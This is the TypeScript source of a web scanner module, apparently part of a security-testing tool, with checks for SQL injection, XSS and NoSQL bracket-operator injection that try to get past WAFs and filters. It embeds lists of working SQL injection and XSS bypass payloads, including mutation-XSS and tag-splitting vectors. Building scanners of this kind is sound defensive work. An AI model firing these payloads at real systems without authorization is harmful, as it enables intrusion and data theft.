import type { Exchange, ScanCheck, ScanCheckContext } from "./types";
import type { HttpRequest } from "../traffic";
import { compareResponses } from "../response-diff";
import { mutateParameter, parameterValue } from "./parameters";
import { h, ok, text, result, observation, sqlError } from "./extended-checks";

const success = (x: Exchange) => ok(x) && x.response!.status >= 200 && x.response!.status < 300;
function same(a: Exchange, b: Exchange, ctx: ScanCheckContext) {
  if (!ok(a) || !ok(b)) return false;
  const diff = compareResponses(a.response!, b.response!, ctx.diffOptions);
  return !diff.statusChanged && !diff.bodyChanged;
}

const sqlEvasionPayloads = [
  "'/**/OR/**/1=1-- -",
  "'\nOR\n1=1-- -",
  "' oR '1'='1",
  "' /*!50000UNION*/ /*!50000SELECT*/ NULL-- -",
  "' UNION\nSELECT\n1,2-- -",
  "' UNION SELECT NULL,NULL-- -",
  "' AND 1=1 AND 'a'='a",
  "' AND 1=CAST((SELECT version()) AS int)-- -",
  "' UNION SELECT CONCAT('slurp','x'),NULL-- -",
  "' AND 1=CHAR(49)-- -",
  "' AND 1=0x31-- -",
];

export const sqlBypass: ScanCheck = {
  id: "sql-bypass",
  name: "SQL injection — filter/WAF bypass payloads",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ctx.stable || !ctx.parameter)
      return result("Stable baselines and selected parameter required.", true);
    if (ctx.baselines.some((x) => sqlError.test(text(x))))
      return result("Baseline already contains SQL error signatures.", true);
    const controlValue = `slurp_${ctx.nonce().replace(/[^a-zA-Z0-9]/g, "")}`;
    for (const payload of sqlEvasionPayloads) {
      const probe = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        "SQL bypass payload",
      );
      const repeat = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        "SQL bypass repeat",
      );
      const control = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, controlValue),
        "SQL bypass benign control",
      );
      if (![probe, repeat, control].every(ok))
        return result("Incomplete SQL bypass evidence.", true);
      if (
        sqlError.test(text(probe)) &&
        sqlError.test(text(repeat)) &&
        !sqlError.test(text(control)) &&
        !ctx.baselines.some((x) => sqlError.test(text(x)))
      ) {
        const signature = text(probe).match(sqlError)?.[0] ?? "database error";
        return observation(
          "SQL errors reproduced with a filter-evasion payload",
          "A WAF/filter-evasion payload produced the same database error twice while a benign value and the baseline did not. This indicates the payload reached the SQL parser despite the evasion syntax; database errors alone do not prove query execution or data access.",
          [...ctx.baselines, probe, repeat, control],
          [`Payload: ${payload}`, `Signature: ${signature}`],
          "medium",
        );
      }
    }
    return result("No repeatable SQL error for the supported evasion payloads.");
  },
};

function htmlResponse(baseline: Exchange) {
  const type = h(baseline, "content-type").toLowerCase();
  return type.includes("html") || text(baseline).trimStart().startsWith("<");
}

export const xssBypass: ScanCheck = {
  id: "xss-bypass",
  name: "XSS — filter/WAF bypass payload reflection",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ctx.stable || !ctx.parameter)
      return result("Stable baselines and selected parameter required.", true);
    if (!htmlResponse(ctx.baselines[0]!))
      return result("An HTML response is required to evaluate markup reflection.", true);
    const tag = `slurp-${ctx.nonce().replace(/[^a-zA-Z0-9]/g, "").toLowerCase()}`;
    const payloads = [
      `"><${tag}>`,
      `<${tag}>`,
      "<svg/onload=alert(1)>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert?.(1)>",
      "<img src=x onerror=&#97;lert(1)>",
      "<scr<script>ipt>alert(1)</script>",
      "<ScRiPt>alert(1)</ScRiPt>",
      "<details open ontoggle=alert(1)>",
      "<video><source onerror=alert(1)>",
      '<a href="java\tscript:alert(1)">x</a>',
      '<a href="java&#x09;script:alert(1)">x</a>',
      '<iframe srcdoc="<script>alert(1)</script>">',
      "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
      '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">',
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<math><annotation-xml encoding="text/html"><style><img src=x onerror=alert(1)></style></annotation-xml></math>',
      '<math><annotation-xml encoding="text/html"><textarea><img src=x onerror=alert(1)></textarea></annotation-xml></math>',
      '<math><annotation-xml encoding="text/html"><noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript></annotation-xml></math>',
      '<svg><a href="&Tab;javascript:alert(1)">x</a></svg>',
      '<svg><a href="&NewLine;javascript:alert(1)">x</a></svg>',
      '</title><script>alert(1)</script>',
      '</script><img src=x onerror=alert(1)>',
      "x</script=+/ + '</script><img src=x onerror=alert(1)>'",
      "function f(x){ return x</script=+/ + '</script><img src=x onerror=alert(1)>' }",
      '<noscript><?x </noscript ?><img src=x onerror=alert(1)></noscript>',
      '<iframe><?x </iframe ?><img src=x onerror=alert(1)></iframe>',
      '<noembed><?x </noembed ?><img src=x onerror=alert(1)></noembed>',
      '<noframes><?x </noframes ?><img src=x onerror=alert(1)></noframes>',
      '<img src=1 {{"on"~"error"}}=alert(1)>',
      '<s{{"c"~"r"~"i"~"p"~"t"}}>alert(1)</s{{"c"~"r"~"i"~"p"~"t"}}>',
      '<a href="{{"java"~"script"}}:alert(1)">click</a>',
      '<i{{"f"~"r"~"a"~"m"~"e"}} {{"on"~"load"}}=alert(1)>',
      '"><script>alert(1)</script>',
    ];
    for (const payload of payloads) {
      const probe = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        "XSS bypass payload",
      );
      const repeat = await ctx.probe(
        mutateParameter(ctx.request, ctx.parameter, payload),
        "XSS bypass repeat",
      );
      if (![probe, repeat].every(ok)) return result("Incomplete XSS bypass evidence.", true);
      if (text(probe).includes(payload) && text(repeat).includes(payload)) {
        return observation(
          "Filter/WAF bypass payload reflected unescaped",
          "A markup-evasion payload appeared byte-for-byte in an HTML response twice, so the filter did not neutralize angle brackets or event attributes for this input. Reflection alone does not confirm execution: the browser context, sanitizer behavior and CSP still matter, and this check does not execute script.",
          [...ctx.baselines, probe, repeat],
          [`Payload: ${payload}`, "Raw payload reflected twice; no script execution performed"],
          "medium",
        );
      }
    }
    return result("No supported evasion payload was reflected unescaped in an HTML response.");
  },
};

type BracketParameter = { kind: "query" | "form"; name: string; occurrence: number };

function withBracketOperator(
  request: HttpRequest,
  parameter: BracketParameter,
  pattern: string,
  encodedKey: boolean,
): HttpRequest {
  const next = structuredClone(request);
  const name = parameter.name;
  const key = encodedKey ? encodeURIComponent(`${name}[$regex]`) : `${name}[$regex]`;
  const encodedValue = encodeURIComponent(pattern);
  const replace = (segments: string[]) => {
    let occurrence = 0;
    return segments.map((segment) => {
      const rawName = segment.split("=")[0]!;
      let decoded = rawName;
      try {
        decoded = decodeURIComponent(rawName.replace(/\+/g, " "));
      } catch {
        return segment;
      }
      if (decoded !== name) return segment;
      const current = occurrence++;
      if (current !== parameter.occurrence) return segment;
      return `${key}=${encodedValue}`;
    });
  };
  if (parameter.kind === "query") {
    const hash = next.url.indexOf("#");
    const end = hash < 0 ? next.url.length : hash;
    const question = next.url.indexOf("?");
    const head = next.url.slice(0, question < 0 ? end : question);
    const query = question < 0 ? "" : next.url.slice(question + 1, end);
    const segments = replace(query ? query.split("&") : []);
    next.url = `${head}?${segments.join("&")}${next.url.slice(end)}`;
  } else {
    const segments = replace(next.body.split("&"));
    next.body = segments.join("&");
  }
  return next;
}

function emptyLike(x: Exchange, baseline: Exchange) {
  const body = text(x).trim();
  const status = x.response!.status;
  if ([401, 403, 404].includes(status)) return true;
  if (!body) return true;
  try {
    const parsed: unknown = JSON.parse(body);
    if (Array.isArray(parsed) && parsed.length === 0) return true;
    if (parsed && typeof parsed === "object") {
      const record = parsed as Record<string, unknown>;
      if (Array.isArray(record["data"]) && record["data"].length === 0) return true;
      if (record["data"] === null) return true;
      if (record["total"] === 0) return true;
    }
  } catch {
    /* non-JSON body */
  }
  return body.length < Math.max(20, text(baseline).length * 0.5);
}

export const nosqlBypass: ScanCheck = {
  id: "nosql-bypass",
  name: "NoSQL injection — query/form bracket operators",
  active: true,
  perParameter: true,
  async run(ctx) {
    if (!ctx.parameter || ctx.parameter.kind === "json")
      return result("Select a query or form parameter; JSON operator checks cover JSON bodies.", true);
    if (!ctx.stable || !ctx.baselines.every(success))
      return result("Stable successful baselines and selected parameter required.", true);
    const original = parameterValue(ctx.request, ctx.parameter);
    if (!original || original.length > 200)
      return result("A bounded non-empty parameter value is required.", true);
    const escaped = original.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const missing = `slurp_missing_${ctx.nonce().replace(/[^a-zA-Z0-9]/g, "")}`;
    for (const encodedKey of [false, true]) {
      const rows: Exchange[] = [];
      for (let round = 0; round < 2; round++) {
        rows.push(
          await ctx.probe(
            withBracketOperator(ctx.request, ctx.parameter, `^${escaped}$`, encodedKey),
            "NoSQL bracket exact pattern",
          ),
          await ctx.probe(
            withBracketOperator(ctx.request, ctx.parameter, `^${missing}$`, encodedKey),
            "NoSQL bracket missing pattern",
          ),
        );
      }
      const restore = await ctx.probe(ctx.request, "NoSQL bracket original restore");
      if (![...rows, restore].every(ok))
        return result("Incomplete NoSQL bracket evidence.", true);
      const [positive, negative, positiveRepeat, negativeRepeat] = rows as [
        Exchange,
        Exchange,
        Exchange,
        Exchange,
      ];
      if (
        same(positive, ctx.baselines[0]!, ctx) &&
        same(positiveRepeat, ctx.baselines[0]!, ctx) &&
        same(negative, negativeRepeat, ctx) &&
        !same(negative, ctx.baselines[0]!, ctx) &&
        !same(positive, negative, ctx) &&
        emptyLike(negative, ctx.baselines[0]!) &&
        same(restore, ctx.baselines[0]!, ctx)
      ) {
        return observation(
          "Possible NoSQL injection: bracket operator syntax interpreted",
          "A bracketed $regex parameter name matched the original value twice, while a missing-value pattern produced a stable empty or denied response and the original request restored the baseline. This indicates operator interpretation in the query layer; intended query-DSL support and authorization impact require review. No broad match or JavaScript evaluation was introduced.",
          [...ctx.baselines, ...rows, restore],
          [
            `Parameter: ${ctx.parameter.name}[$regex]`,
            encodedKey ? "Percent-encoded bracket name accepted" : "Raw bracket name accepted",
          ],
          "medium",
        );
      }
    }
    return result("No repeated exact-match/missing bracket-operator differential.");
  },
};

export const bypassChecks = [sqlBypass, xssBypass, nosqlBypass];
